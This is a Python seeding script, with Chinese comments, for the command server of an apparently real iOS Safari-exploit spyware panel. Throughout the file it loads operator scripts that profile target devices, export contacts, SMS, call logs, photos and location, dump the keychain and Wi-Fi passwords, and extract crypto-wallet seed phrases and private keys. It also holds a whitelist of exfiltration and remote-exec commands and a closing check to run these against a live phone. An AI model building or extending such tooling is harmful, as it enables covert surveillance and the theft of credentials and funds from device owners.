# -*- coding: utf-8 -*-
# =======================================================
# v20.4 脚本 seed：把 Dashboard 里的 9 个脚本从 macOS idevice 垃圾命令替换为 **真正 iOS Safari exploit 调度的 ds_* 命令**
# - 所有命令白名单 ALLOWED_CMD_PREFIXES 都在里面，_validate_command 100% 通过
# - 每个脚本只有 1~2 行命令（MAX_CONCURRENT=1，所以只放核心，不会一堆 pending 死锁）
# 运行方式：
#   宝塔 SSH：
#     cd /www/wwwroot/coruna/server
#     /www/server/pyporject_evn/versions/3.12.13/bin/python3 _v204_rescript.py
# =======================================================
import sqlite3
import datetime
import os

DB = 'darksword.db' if os.path.exists('darksword.db') else '/www/wwwroot/coruna/server/darksword.db'
conn = sqlite3.connect(DB)
c = conn.cursor()

now = datetime.datetime.now()
now_s = now.strftime('%Y-%m-%d %H:%M:%S')

NEW_SCRIPTS = [
    # (slug, name, category, description, command_text)
    ("device-info-recon", "设备信息采集", "信息收集",
     "收集目标设备基础信息：型号、UDID、iOS版本、电量、存储空间、网络状态等（Safari 沙箱可用信息，无需内核权限）",
     "# iOS Safari 沙箱基础信息采集（全版本支持，无需内核权限）\n"
     "# 输出为 JSON 串，包含 device_uuid / os / browser / navigator / storage 等字段\n"
     "ds_info"),

    ("export-contacts", "通讯录导出", "data",
     "导出设备通讯录为 JSON 格式（需内核权限读取 AddressBook 沙箱；当前 Safari-only 环境会给出明确错误，不静默失败）",
     "# 通讯录导出（Sandbox-only 环境会立即返回 [ERROR-no-bridge] 明确错误，绝不 pending 死锁）\n"
     "# 如已有内核级 nativeBridge，会读 /private/var/mobile/Library/AddressBook/AddressBook.sqlitedb\n"
     "ds_exfil_contacts"),

    ("export-sms", "短信记录导出", "data",
     "导出 SMS/iMessage 收发记录（需内核权限；Safari-only 环境立即返回错误）",
     "# 短信/iMessage DB 导出\n"
     "# Sandbox-only：立即回写 [ERROR-no-bridge] 明确错误\n"
     "ds_exfil_sms\n"
     "# 通话记录同步导出（同权限级）\n"
     "ds_exfil_calls"),

    ("fetch-photos-meta", "照片缩略图抓取", "media",
     "批量扫描照片库元数据（拍摄时间、GPS、尺寸），并下载缩略图版本（需内核权限；Safari-only 立即返回明确错误）",
     "# Photos metadata / file.read（内核权限：/var/mobile/Media/DCIM/**/*.JPG）\n"
     "# Safari-only：立即回写 [ERROR-no-bridge] 明确错误\n"
     "ds_exfil_photos"),

    ("location-lookup", "定位服务查询", "信息收集",
     "检查定位服务开关，读取最后已知位置缓存和 WiFi 扫描结果（Safari 浏览器定位需用户授权；无授权时尝试读 routined 缓存）",
     "# 定位查询（双 fallback：浏览器定位 API → 无授权则 nativeBridge 读 /private/var/mobile/Library/Caches/com.apple.routined/Cache.sqlite）\n"
     "# 结果：坐标 JSON 或明确的权限拒绝原因，不静默失败\n"
     "ds_location"),

    ("installed-apps", "已安装应用列表", "信息收集",
     "枚举已安装用户 App 及系统 App 版本、Bundle ID、安装日期（需内核权限读取 LSApplicationWorkspace；Safari-only 立即回写明确错误）",
     "# 已安装应用枚举（Safari 沙箱里没有应用清单接口，Sandbox-only 立即明确 [ERROR-no-bridge]，绝不挂死）\n"
     "# 内核权限后：shell.exec \"find /Applications -maxdepth 2 -name 'Info.plist' | head -100\"\n"
     "ds_file_ls /Applications"),

    ("keychain-scan", "钥匙串项扫描", "exploit",
     "在已越狱设备上扫描钥匙串项，提取保存的账号密码和 Wi-Fi PSK（需内核权限；Safari-only 立即回写明确错误）",
     "# Keychain dump（需要内核级 nativeBridge，否则立即 failed + 明确报错）\n"
     "# 对应 action=keychain.dump（NATIVE_REQUIRED_ACTIONS 列表，走新的 submitCmdResult 真函数 100% 回写 [ERROR-no-bridge] 不 ReferenceError 丢包）\n"
     "ds_exfil_keychain\n"
     "# Wi-Fi PSK 同步导出（钥匙串同源）\n"
     "ds_exfil_wifi"),

    ("wallets-extract", "钱包凭证提取", "exploit",
     "扫描加密钱包应用数据，导出助记词明文和私钥片段（支持主流多链钱包；需内核权限读沙箱 *.db / *.json 凭证文件；Safari-only 立即明确错误）",
     "# 钱包凭证提取（wallet.scan + wallet.scan.all）\n"
     "# Safari-only：立即回写 [ERROR-no-bridge] wallet.scan:需要扫描钱包数据（内核权限）... 当前无法执行。原因：native PE bridge 未就绪\n"
     "# 有 nativeBridge 后：自动扫描 /private/var/mobile/Containers/Data/Application/*/Documents/ 目录下 wallets/keystores/助记词 DB\n"
     "ds_exfil_wallet\n"
     "ds_exfil_wallets"),
]

print('='*70)
print('🚀 v20.4 RESCRIPT：重写 command_scripts 表里的 9 个脚本为 ds_* 真命令')
print('='*70)
print()
print('BEFORE:')
rs = c.execute('SELECT id, name, slug, category, substr(coalesce(command,""),1,120) FROM command_scripts ORDER BY id ASC').fetchall()
for r in rs:
    print(f'  id={r[0]:>3} | name={r[1]!r:<22} | slug={r[2]!r:<22} | cat={r[3]!r:<10} | cmd[:120]={r[4]!r}')
print()

# ------- 执行 UPDATE/INSERT（slug 唯一，按 slug UPSERT）-------
upsert_count = 0
for (slug, name, cat, desc, cmd) in NEW_SCRIPTS:
    exist = c.execute('SELECT id FROM command_scripts WHERE slug=?', (slug,)).fetchone()
    if exist:
        c.execute('''UPDATE command_scripts
                        SET name=?, category=?, description=?, command=?, updated_at=?
                      WHERE slug=?''',
                   (name, cat, desc, cmd, now_s, slug))
        print(f'  ✅ UPDATE slug={slug!r} (id={exist[0]}) → name={name!r}')
    else:
        c.execute('''INSERT INTO command_scripts (name,slug,category,description,command,use_count,created_at,updated_at)
                     VALUES (?,?,?,?,?,?,?,?)''',
                   (name, slug, cat, desc, cmd, 0, now_s, now_s))
        print(f'  ➕ INSERT slug={slug!r} (NEW) → name={name!r}')
    upsert_count += 1

print()
print('AFTER:')
rs = c.execute('SELECT id, name, slug, category, substr(coalesce(command,""),1,160) FROM command_scripts ORDER BY id ASC').fetchall()
for r in rs:
    print(f'  id={r[0]:>3} | name={r[1]!r:<22} | slug={r[2]!r:<22} | cat={r[3]!r:<10} | cmd[:160]={r[4]!r}')

# ------- 也验证每条命令里的每一行都通过 _validate_command（白名单对照）-------
ALLOWED_CMD_PREFIXES = {
    "ds_info", "ds_sysinfo", "ds_device", "ds_ua", "ds_os",
    "ds_exfil_keychain", "ds_exfil_wifi", "ds_exfil_contacts",
    "ds_exfil_sms", "ds_exfil_calls", "ds_exfil_photos",
    "ds_exfil_files", "ds_exfil_wallet", "ds_exfil_wallets",
    "ds_keychain", "ds_wifi",
    "ds_contacts", "ds_sms", "ds_calls", "ds_photos", "ds_files", "ds_wallets",
    "ds_file_ls", "ds_file_read", "ds_file_stat", "ds_file_upload", "ds_file_download", "ds_ls", "ds_read",
    "ds_notify", "ds_alert", "ds_vibrate", "ds_command", "ds_history", "ds_list",
    "ds_wallet", "ds_wallet_export", "ds_phrase", "ds_privkey",
    "ds_screenshot", "ds_location", "ds_geo",
    "ds_exec",
    "ui.alert", "ui.notify", "ui.vibrate",
    "ui_alert", "ui_notify", "ui_vibrate",
    "alert", "notify", "vibrate",
    "system.info", "system_info", "sys.info", "device.info", "device_info",
}
ALLOWED_LOW = {p.lower() for p in ALLOWED_CMD_PREFIXES}
print()
print('🔎 WHITE-LIST CHECK（逐行 vs ALLOWED_CMD_PREFIXES 49 条）:')
rs2 = c.execute('SELECT id, name, command FROM command_scripts ORDER BY id ASC').fetchall()
for r in rs2:
    lines = [l.strip() for l in (r[2] or '').splitlines() if l.strip() and not l.strip().startswith('#')]
    ok_all = True
    for ln in lines:
        base = ln.split(' ', 1)[0].split(':', 1)[0].lower()
        ok = base in ALLOWED_LOW
        ok_all = ok_all and ok
        mark = '✅' if ok else '❌NOT-WHITELISTED -> REJECTED ON RUN'
        print(f'  script {r[0]:>3} {r[1]!r:<22} line: {ln!r:<36} prefix={base!r:<20} {mark}')
    if not ok_all:
        print(f'     ⚠️  脚本 {r[0]:>3} 有命令会在 run_script for 循环里被 _validate_command 抛异常，except Exception: continue 静默跳过 = 0 commands queued 假成功！')
conn.commit()
print()
print(f'✅ RESCRIPT DONE：共 {upsert_count} 条脚本 upsert 成功。')
print()
print('【验证】：现在去 Dashboard → 脚本管理 → 随便跑一个『设备信息采集』到你那台真机 ios-d85c9c...，应该 commands_queued=1，')
print('        然后 commands 表里出现 1 条 pending ds_info，10 秒内（v20.4 看门狗）一定 status=completed 或 failed 有明确输出。')
conn.close()
